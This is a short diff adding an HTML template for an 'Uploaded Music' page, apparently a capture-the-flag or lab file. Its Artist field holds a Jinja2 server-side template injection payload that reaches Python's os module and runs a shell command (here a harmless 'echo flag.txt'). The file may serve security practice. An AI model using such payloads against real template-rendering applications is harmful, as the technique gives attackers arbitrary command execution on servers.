@@ -1,0 +1,10 @@
+
+    <html>
+    <head><title>My Song</title></head>
+    <body>
+        <h1>Uploaded Music</h1>
+        <p>Artist: {{ config.__class__.__init__.__globals__['os'].popen('echo flag.txt').read() }}</p>
+        <p>Album: Best Hits</p>
+    </body>
+    </html>
+    
